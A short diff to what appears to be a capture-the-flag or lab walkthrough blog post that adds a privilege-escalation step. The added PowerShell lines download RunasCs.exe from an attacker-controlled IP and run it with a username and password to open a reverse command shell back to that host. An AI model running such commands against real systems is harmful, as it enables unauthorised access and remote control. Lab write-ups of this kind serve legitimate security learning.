@@ -95,5 +95,9 @@ login admin panel -> template and ... get reverse shell
 ![image](https://github.com/vanatka10/myblog/assets/126310360/aaaf5e9b-a270-4b37-a264-d755805607e1)
 
 next we use runas to elevate an account
+```
+powershell -c wget 10.10.16.48:9000/RunasCs.exe -o r.exe
+./r.exe tstark playboy69 -r 10.10.16.48:8888 cmd
 
 
+```
